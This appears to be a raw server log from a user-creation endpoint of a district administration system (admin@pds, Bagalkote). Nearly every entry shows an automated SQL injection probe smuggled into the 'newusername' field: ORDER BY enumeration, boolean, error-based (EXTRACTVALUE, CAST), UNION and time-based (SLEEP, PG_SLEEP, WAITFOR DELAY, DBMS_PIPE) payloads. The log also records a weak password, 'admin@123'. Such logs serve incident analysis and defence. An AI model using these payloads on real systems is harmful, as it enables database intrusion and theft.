[2025-03-18 16:49:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1511-- qsAv","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1511-- qsAv
[2025-03-18 16:49:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1-- YRuw","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1-- YRuw
[2025-03-18 16:49:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 9955-- mNLF","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 9955-- mNLF
[2025-03-18 16:49:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1-- YhvO","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1-- YhvO
[2025-03-18 16:49:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 5846-- VdGJ","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 5846-- VdGJ
[2025-03-18 16:49:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1-- ZFuM","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1-- ZFuM
[2025-03-18 16:49:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 8495-- kWRA","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 8495-- kWRA
[2025-03-18 16:49:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1-- Sljr","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1-- Sljr
[2025-03-18 16:49:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 3659-- hdNZ","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 3659-- hdNZ
[2025-03-18 16:51:14] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"9265","district":"Bagalkote","newpassword":"admin@123"} | 9265
[2025-03-18 16:51:15] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin.","district":"Bagalkote","newpassword":"admin@123"} | admin.
[2025-03-18 16:51:15] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminpjnqMhmafaVQ","district":"Bagalkote","newpassword":"admin@123"} | adminpjnqMhmafaVQ
[2025-03-18 16:51:15] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND71912063AND48674867","district":"Bagalkote","newpassword":"admin@123"} | adminAND71912063AND48674867
[2025-03-18 16:51:16] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND70487048AND30663066","district":"Bagalkote","newpassword":"admin@123"} | adminAND70487048AND30663066
[2025-03-18 16:51:16] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND42253732","district":"Bagalkote","newpassword":"admin@123"} | adminAND42253732
[2025-03-18 16:51:16] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND70487048","district":"Bagalkote","newpassword":"admin@123"} | adminAND70487048
[2025-03-18 16:51:16] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND52518386ANDOtKXOtKX","district":"Bagalkote","newpassword":"admin@123"} | adminAND52518386ANDOtKXOtKX
[2025-03-18 16:51:17] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND70487048ANDeeaJeeaJ","district":"Bagalkote","newpassword":"admin@123"} | adminAND70487048ANDeeaJeeaJ
[2025-03-18 16:51:17] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND43487419ANDiiyWiiyW","district":"Bagalkote","newpassword":"admin@123"} | adminAND43487419ANDiiyWiiyW
[2025-03-18 16:51:17] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND70487048ANDfsHNfsHN","district":"Bagalkote","newpassword":"admin@123"} | adminAND70487048ANDfsHNfsHN
[2025-03-18 16:51:17] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND36907455--UlGV","district":"Bagalkote","newpassword":"admin@123"} | adminAND36907455--UlGV
[2025-03-18 16:51:17] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND70487048--CKFb","district":"Bagalkote","newpassword":"admin@123"} | adminAND70487048--CKFb
[2025-03-18 16:51:17] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECTCASEWHEN65688517THENadminELSESELECT8517UNIONSELECT4907END","district":"Bagalkote","newpassword":"admin@123"} | SELECTCASEWHEN65688517THENadminELSESELECT8517UNIONSELECT4907END
[2025-03-18 16:51:18] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECTCASEWHEN10051005THENadminELSESELECT5291UNIONSELECT2412END","district":"Bagalkote","newpassword":"admin@123"} | SELECTCASEWHEN10051005THENadminELSESELECT5291UNIONSELECT2412END
[2025-03-18 16:51:18] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDEXTRACTVALUE2042CONCAT0x5c0x7176766b71SELECTELT2042204210x7171766b71AND29592959","district":"Bagalkote","newpassword":"admin@123"} | adminANDEXTRACTVALUE2042CONCAT0x5c0x7176766b71SELECTELT2042204210x7171766b71AND29592959
[2025-03-18 16:51:18] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDEXTRACTVALUE2042CONCAT0x5c0x7176766b71SELECTELT2042204210x7171766b71","district":"Bagalkote","newpassword":"admin@123"} | adminANDEXTRACTVALUE2042CONCAT0x5c0x7176766b71SELECTELT2042204210x7171766b71
[2025-03-18 16:51:18] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDEXTRACTVALUE2042CONCAT0x5c0x7176766b71SELECTELT2042204210x7171766b71ANDXEIEXEIE","district":"Bagalkote","newpassword":"admin@123"} | adminANDEXTRACTVALUE2042CONCAT0x5c0x7176766b71SELECTELT2042204210x7171766b71ANDXEIEXEIE
[2025-03-18 16:51:18] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDEXTRACTVALUE2042CONCAT0x5c0x7176766b71SELECTELT2042204210x7171766b71ANDrNkOrNkO","district":"Bagalkote","newpassword":"admin@123"} | adminANDEXTRACTVALUE2042CONCAT0x5c0x7176766b71SELECTELT2042204210x7171766b71ANDrNkOrNkO
[2025-03-18 16:51:19] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDEXTRACTVALUE2042CONCAT0x5c0x7176766b71SELECTELT2042204210x7171766b71--ywpT","district":"Bagalkote","newpassword":"admin@123"} | adminANDEXTRACTVALUE2042CONCAT0x5c0x7176766b71SELECTELT2042204210x7171766b71--ywpT
[2025-03-18 16:51:19] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND6190CASTCHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN61906190THEN1ELSE0ENDtextCHR113CHR113CHR118CHR107CHR113ASNUMERICAND48204820","district":"Bagalkote","newpassword":"admin@123"} | adminAND6190CASTCHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN61906190THEN1ELSE0ENDtextCHR113CHR113CHR118CHR107CHR113ASNUMERICAND48204820
[2025-03-18 16:51:19] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND6190CASTCHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN61906190THEN1ELSE0ENDtextCHR113CHR113CHR118CHR107CHR113ASNUMERIC","district":"Bagalkote","newpassword":"admin@123"} | adminAND6190CASTCHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN61906190THEN1ELSE0ENDtextCHR113CHR113CHR118CHR107CHR113ASNUMERIC
[2025-03-18 16:51:19] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND6190CASTCHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN61906190THEN1ELSE0ENDtextCHR113CHR113CHR118CHR107CHR113ASNUMERICANDHcAnHcAn","district":"Bagalkote","newpassword":"admin@123"} | adminAND6190CASTCHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN61906190THEN1ELSE0ENDtextCHR113CHR113CHR118CHR107CHR113ASNUMERICANDHcAnHcAn
[2025-03-18 16:51:19] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND6190CASTCHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN61906190THEN1ELSE0ENDtextCHR113CHR113CHR118CHR107CHR113ASNUMERICANDGDHTGDHT","district":"Bagalkote","newpassword":"admin@123"} | adminAND6190CASTCHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN61906190THEN1ELSE0ENDtextCHR113CHR113CHR118CHR107CHR113ASNUMERICANDGDHTGDHT
[2025-03-18 16:51:19] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND6190CASTCHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN61906190THEN1ELSE0ENDtextCHR113CHR113CHR118CHR107CHR113ASNUMERIC--LDRl","district":"Bagalkote","newpassword":"admin@123"} | adminAND6190CASTCHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN61906190THEN1ELSE0ENDtextCHR113CHR113CHR118CHR107CHR113ASNUMERIC--LDRl
[2025-03-18 16:51:20] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND4062INSELECTCHAR113CHAR118CHAR118CHAR107CHAR113SELECTCASEWHEN40624062THENCHAR49ELSECHAR48ENDCHAR113CHAR113CHAR118CHAR107CHAR113AND71417141","district":"Bagalkote","newpassword":"admin@123"} | adminAND4062INSELECTCHAR113CHAR118CHAR118CHAR107CHAR113SELECTCASEWHEN40624062THENCHAR49ELSECHAR48ENDCHAR113CHAR113CHAR118CHAR107CHAR113AND71417141
[2025-03-18 16:51:20] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND4062INSELECTCHAR113CHAR118CHAR118CHAR107CHAR113SELECTCASEWHEN40624062THENCHAR49ELSECHAR48ENDCHAR113CHAR113CHAR118CHAR107CHAR113","district":"Bagalkote","newpassword":"admin@123"} | adminAND4062INSELECTCHAR113CHAR118CHAR118CHAR107CHAR113SELECTCASEWHEN40624062THENCHAR49ELSECHAR48ENDCHAR113CHAR113CHAR118CHAR107CHAR113
[2025-03-18 16:51:20] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND4062INSELECTCHAR113CHAR118CHAR118CHAR107CHAR113SELECTCASEWHEN40624062THENCHAR49ELSECHAR48ENDCHAR113CHAR113CHAR118CHAR107CHAR113ANDJhPiJhPi","district":"Bagalkote","newpassword":"admin@123"} | adminAND4062INSELECTCHAR113CHAR118CHAR118CHAR107CHAR113SELECTCASEWHEN40624062THENCHAR49ELSECHAR48ENDCHAR113CHAR113CHAR118CHAR107CHAR113ANDJhPiJhPi
[2025-03-18 16:51:20] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND4062INSELECTCHAR113CHAR118CHAR118CHAR107CHAR113SELECTCASEWHEN40624062THENCHAR49ELSECHAR48ENDCHAR113CHAR113CHAR118CHAR107CHAR113ANDMKfrMKfr","district":"Bagalkote","newpassword":"admin@123"} | adminAND4062INSELECTCHAR113CHAR118CHAR118CHAR107CHAR113SELECTCASEWHEN40624062THENCHAR49ELSECHAR48ENDCHAR113CHAR113CHAR118CHAR107CHAR113ANDMKfrMKfr
[2025-03-18 16:51:20] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND4062INSELECTCHAR113CHAR118CHAR118CHAR107CHAR113SELECTCASEWHEN40624062THENCHAR49ELSECHAR48ENDCHAR113CHAR113CHAR118CHAR107CHAR113--zSvc","district":"Bagalkote","newpassword":"admin@123"} | adminAND4062INSELECTCHAR113CHAR118CHAR118CHAR107CHAR113SELECTCASEWHEN40624062THENCHAR49ELSECHAR48ENDCHAR113CHAR113CHAR118CHAR107CHAR113--zSvc
[2025-03-18 16:51:21] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND2809SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN28092809THEN1ELSE0ENDFROMDUALCHR113CHR113CHR118CHR107CHR113CHR62FROMDUALAND91649164","district":"Bagalkote","newpassword":"admin@123"} | adminAND2809SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN28092809THEN1ELSE0ENDFROMDUALCHR113CHR113CHR118CHR107CHR113CHR62FROMDUALAND91649164
[2025-03-18 16:51:21] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND2809SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN28092809THEN1ELSE0ENDFROMDUALCHR113CHR113CHR118CHR107CHR113CHR62FROMDUAL","district":"Bagalkote","newpassword":"admin@123"} | adminAND2809SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN28092809THEN1ELSE0ENDFROMDUALCHR113CHR113CHR118CHR107CHR113CHR62FROMDUAL
[2025-03-18 16:51:21] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND2809SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN28092809THEN1ELSE0ENDFROMDUALCHR113CHR113CHR118CHR107CHR113CHR62FROMDUALANDYByYYByY","district":"Bagalkote","newpassword":"admin@123"} | adminAND2809SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN28092809THEN1ELSE0ENDFROMDUALCHR113CHR113CHR118CHR107CHR113CHR62FROMDUALANDYByYYByY
[2025-03-18 16:51:21] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND2809SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN28092809THEN1ELSE0ENDFROMDUALCHR113CHR113CHR118CHR107CHR113CHR62FROMDUALANDsflSsflS","district":"Bagalkote","newpassword":"admin@123"} | adminAND2809SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN28092809THEN1ELSE0ENDFROMDUALCHR113CHR113CHR118CHR107CHR113CHR62FROMDUALANDsflSsflS
[2025-03-18 16:51:21] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND2809SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN28092809THEN1ELSE0ENDFROMDUALCHR113CHR113CHR118CHR107CHR113CHR62FROMDUAL--GutA","district":"Bagalkote","newpassword":"admin@123"} | adminAND2809SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR118CHR107CHR113SELECTCASEWHEN28092809THEN1ELSE0ENDFROMDUALCHR113CHR113CHR118CHR107CHR113CHR62FROMDUAL--GutA
[2025-03-18 16:51:22] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECTCONCATCONCATqvvkqCASEWHEN70367036THEN1ELSE0ENDqqvkq","district":"Bagalkote","newpassword":"admin@123"} | SELECTCONCATCONCATqvvkqCASEWHEN70367036THEN1ELSE0ENDqqvkq
[2025-03-18 16:51:22] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminSELECTPG_SLEEP5--","district":"Bagalkote","newpassword":"admin@123"} | adminSELECTPG_SLEEP5--
[2025-03-18 16:51:23] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFORDELAY005--","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFORDELAY005--
[2025-03-18 16:51:23] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminSELECTDBMS_PIPE.RECEIVE_MESSAGECHR105CHR113CHR110CHR1045FROMDUAL--","district":"Bagalkote","newpassword":"admin@123"} | adminSELECTDBMS_PIPE.RECEIVE_MESSAGECHR105CHR113CHR110CHR1045FROMDUAL--
[2025-03-18 16:51:24] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDSELECT8138FROMSELECTSLEEP5YjGdAND72917291","district":"Bagalkote","newpassword":"admin@123"} | adminANDSELECT8138FROMSELECTSLEEP5YjGdAND72917291
[2025-03-18 16:51:24] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDSELECT8138FROMSELECTSLEEP5YjGd","district":"Bagalkote","newpassword":"admin@123"} | adminANDSELECT8138FROMSELECTSLEEP5YjGd
[2025-03-18 16:51:24] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDSELECT8138FROMSELECTSLEEP5YjGdANDuMwSuMwS","district":"Bagalkote","newpassword":"admin@123"} | adminANDSELECT8138FROMSELECTSLEEP5YjGdANDuMwSuMwS
[2025-03-18 16:51:25] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDSELECT8138FROMSELECTSLEEP5YjGdANDyLERyLER","district":"Bagalkote","newpassword":"admin@123"} | adminANDSELECT8138FROMSELECTSLEEP5YjGdANDyLERyLER
[2025-03-18 16:51:25] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDSELECT8138FROMSELECTSLEEP5YjGd--PGZr","district":"Bagalkote","newpassword":"admin@123"} | adminANDSELECT8138FROMSELECTSLEEP5YjGd--PGZr
[2025-03-18 16:51:25] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND9062SELECT9062FROMPG_SLEEP5AND82128212","district":"Bagalkote","newpassword":"admin@123"} | adminAND9062SELECT9062FROMPG_SLEEP5AND82128212
[2025-03-18 16:51:25] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND9062SELECT9062FROMPG_SLEEP5","district":"Bagalkote","newpassword":"admin@123"} | adminAND9062SELECT9062FROMPG_SLEEP5
[2025-03-18 16:51:25] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND9062SELECT9062FROMPG_SLEEP5ANDNdhqNdhq","district":"Bagalkote","newpassword":"admin@123"} | adminAND9062SELECT9062FROMPG_SLEEP5ANDNdhqNdhq
[2025-03-18 16:51:25] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND9062SELECT9062FROMPG_SLEEP5ANDtOLKtOLK","district":"Bagalkote","newpassword":"admin@123"} | adminAND9062SELECT9062FROMPG_SLEEP5ANDtOLKtOLK
[2025-03-18 16:51:26] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND9062SELECT9062FROMPG_SLEEP5--bkHk","district":"Bagalkote","newpassword":"admin@123"} | adminAND9062SELECT9062FROMPG_SLEEP5--bkHk
[2025-03-18 16:51:26] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFORDELAY005AND11901190","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFORDELAY005AND11901190
[2025-03-18 16:51:26] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFORDELAY005","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFORDELAY005
[2025-03-18 16:51:26] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFORDELAY005ANDDRXDDRXD","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFORDELAY005ANDDRXDDRXD
[2025-03-18 16:51:26] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFORDELAY005ANDCtjZCtjZ","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFORDELAY005ANDCtjZCtjZ
[2025-03-18 16:51:27] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFORDELAY005--TwnR","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFORDELAY005--TwnR
[2025-03-18 16:51:27] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND8093DBMS_PIPE.RECEIVE_MESSAGECHR122CHR97CHR84CHR905AND19641964","district":"Bagalkote","newpassword":"admin@123"} | adminAND8093DBMS_PIPE.RECEIVE_MESSAGECHR122CHR97CHR84CHR905AND19641964
[2025-03-18 16:51:27] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND8093DBMS_PIPE.RECEIVE_MESSAGECHR122CHR97CHR84CHR905","district":"Bagalkote","newpassword":"admin@123"} | adminAND8093DBMS_PIPE.RECEIVE_MESSAGECHR122CHR97CHR84CHR905
[2025-03-18 16:51:27] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND8093DBMS_PIPE.RECEIVE_MESSAGECHR122CHR97CHR84CHR905ANDFxNXFxNX","district":"Bagalkote","newpassword":"admin@123"} | adminAND8093DBMS_PIPE.RECEIVE_MESSAGECHR122CHR97CHR84CHR905ANDFxNXFxNX
[2025-03-18 16:51:27] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND8093DBMS_PIPE.RECEIVE_MESSAGECHR122CHR97CHR84CHR905ANDGVKEGVKE","district":"Bagalkote","newpassword":"admin@123"} | adminAND8093DBMS_PIPE.RECEIVE_MESSAGECHR122CHR97CHR84CHR905ANDGVKEGVKE
[2025-03-18 16:51:28] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND8093DBMS_PIPE.RECEIVE_MESSAGECHR122CHR97CHR84CHR905--mPXt","district":"Bagalkote","newpassword":"admin@123"} | adminAND8093DBMS_PIPE.RECEIVE_MESSAGECHR122CHR97CHR84CHR905--mPXt
[2025-03-18 16:51:39] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY1--BkoZ","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY1--BkoZ
[2025-03-18 16:51:39] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY4018--cHit","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY4018--cHit
[2025-03-18 16:51:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY1--UpPX","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY1--UpPX
[2025-03-18 16:51:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY2256--gCiv","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY2256--gCiv
[2025-03-18 16:51:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY1--Xuka","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY1--Xuka
[2025-03-18 16:51:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY2460--fnBD","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY2460--fnBD
[2025-03-18 16:51:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY1--KcdZ","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY1--KcdZ
[2025-03-18 16:51:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY2967--zMft","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY2967--zMft
[2025-03-18 16:51:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY1--wKGM","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY1--wKGM
[2025-03-18 16:51:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY8622--oADG","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY8622--oADG
[2025-03-18 17:10:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"2074","district":"Bagalkote","newpassword":"admin@123"} | 2074
[2025-03-18 17:10:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminvZGLJjexxoFN","district":"Bagalkote","newpassword":"admin@123"} | adminvZGLJjexxoFN
[2025-03-18 17:10:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 77998944 AND 41294129","district":"Bagalkote","newpassword":"admin@123"} | admin AND 77998944 AND 41294129
[2025-03-18 17:10:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 75417541 AND 84718471","district":"Bagalkote","newpassword":"admin@123"} | admin AND 75417541 AND 84718471
[2025-03-18 17:10:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 81029258","district":"Bagalkote","newpassword":"admin@123"} | admin AND 81029258
[2025-03-18 17:10:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 75417541","district":"Bagalkote","newpassword":"admin@123"} | admin AND 75417541
[2025-03-18 17:10:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 60427988 AND xYBkxYBk","district":"Bagalkote","newpassword":"admin@123"} | admin AND 60427988 AND xYBkxYBk
[2025-03-18 17:10:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 75417541 AND MMAqMMAq","district":"Bagalkote","newpassword":"admin@123"} | admin AND 75417541 AND MMAqMMAq
[2025-03-18 17:10:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 89423880 AND orXjorXj","district":"Bagalkote","newpassword":"admin@123"} | admin AND 89423880 AND orXjorXj
[2025-03-18 17:10:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 75417541 AND eDyveDyv","district":"Bagalkote","newpassword":"admin@123"} | admin AND 75417541 AND eDyveDyv
[2025-03-18 17:10:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 89153618-- CJuZ","district":"Bagalkote","newpassword":"admin@123"} | admin AND 89153618-- CJuZ
[2025-03-18 17:10:43] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 75417541-- yMki","district":"Bagalkote","newpassword":"admin@123"} | admin AND 75417541-- yMki
[2025-03-18 17:10:43] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECT CASE WHEN 49228811 THEN admin ELSE SELECT 8811 UNION SELECT 2315 END","district":"Bagalkote","newpassword":"admin@123"} | SELECT CASE WHEN 49228811 THEN admin ELSE SELECT 8811 UNION SELECT 2315 END
[2025-03-18 17:10:43] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECT CASE WHEN 97569756 THEN admin ELSE SELECT 9956 UNION SELECT 6137 END","district":"Bagalkote","newpassword":"admin@123"} | SELECT CASE WHEN 97569756 THEN admin ELSE SELECT 9956 UNION SELECT 6137 END
[2025-03-18 17:10:43] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND EXTRACTVALUE1943CONCAT0x5c0x7178766271SELECT ELT1943194310x71716b7071 AND 60436043","district":"Bagalkote","newpassword":"admin@123"} | admin AND EXTRACTVALUE1943CONCAT0x5c0x7178766271SELECT ELT1943194310x71716b7071 AND 60436043
[2025-03-18 17:10:43] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND EXTRACTVALUE1943CONCAT0x5c0x7178766271SELECT ELT1943194310x71716b7071","district":"Bagalkote","newpassword":"admin@123"} | admin AND EXTRACTVALUE1943CONCAT0x5c0x7178766271SELECT ELT1943194310x71716b7071
[2025-03-18 17:10:44] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND EXTRACTVALUE1943CONCAT0x5c0x7178766271SELECT ELT1943194310x71716b7071 AND uoFiuoFi","district":"Bagalkote","newpassword":"admin@123"} | admin AND EXTRACTVALUE1943CONCAT0x5c0x7178766271SELECT ELT1943194310x71716b7071 AND uoFiuoFi
[2025-03-18 17:10:44] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND EXTRACTVALUE1943CONCAT0x5c0x7178766271SELECT ELT1943194310x71716b7071 AND kmPZkmPZ","district":"Bagalkote","newpassword":"admin@123"} | admin AND EXTRACTVALUE1943CONCAT0x5c0x7178766271SELECT ELT1943194310x71716b7071 AND kmPZkmPZ
[2025-03-18 17:10:44] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND EXTRACTVALUE1943CONCAT0x5c0x7178766271SELECT ELT1943194310x71716b7071-- WAPH","district":"Bagalkote","newpassword":"admin@123"} | admin AND EXTRACTVALUE1943CONCAT0x5c0x7178766271SELECT ELT1943194310x71716b7071-- WAPH
[2025-03-18 17:10:44] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 7632CASTCHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 76327632 THEN 1 ELSE 0 ENDtextCHR113CHR113CHR107CHR112CHR113 AS NUMERIC AND 50935093","district":"Bagalkote","newpassword":"admin@123"} | admin AND 7632CASTCHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 76327632 THEN 1 ELSE 0 ENDtextCHR113CHR113CHR107CHR112CHR113 AS NUMERIC AND 50935093
[2025-03-18 17:10:44] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 7632CASTCHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 76327632 THEN 1 ELSE 0 ENDtextCHR113CHR113CHR107CHR112CHR113 AS NUMERIC","district":"Bagalkote","newpassword":"admin@123"} | admin AND 7632CASTCHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 76327632 THEN 1 ELSE 0 ENDtextCHR113CHR113CHR107CHR112CHR113 AS NUMERIC
[2025-03-18 17:10:44] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 7632CASTCHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 76327632 THEN 1 ELSE 0 ENDtextCHR113CHR113CHR107CHR112CHR113 AS NUMERIC AND pdvopdvo","district":"Bagalkote","newpassword":"admin@123"} | admin AND 7632CASTCHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 76327632 THEN 1 ELSE 0 ENDtextCHR113CHR113CHR107CHR112CHR113 AS NUMERIC AND pdvopdvo
[2025-03-18 17:10:45] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 7632CASTCHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 76327632 THEN 1 ELSE 0 ENDtextCHR113CHR113CHR107CHR112CHR113 AS NUMERIC AND IJBAIJBA","district":"Bagalkote","newpassword":"admin@123"} | admin AND 7632CASTCHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 76327632 THEN 1 ELSE 0 ENDtextCHR113CHR113CHR107CHR112CHR113 AS NUMERIC AND IJBAIJBA
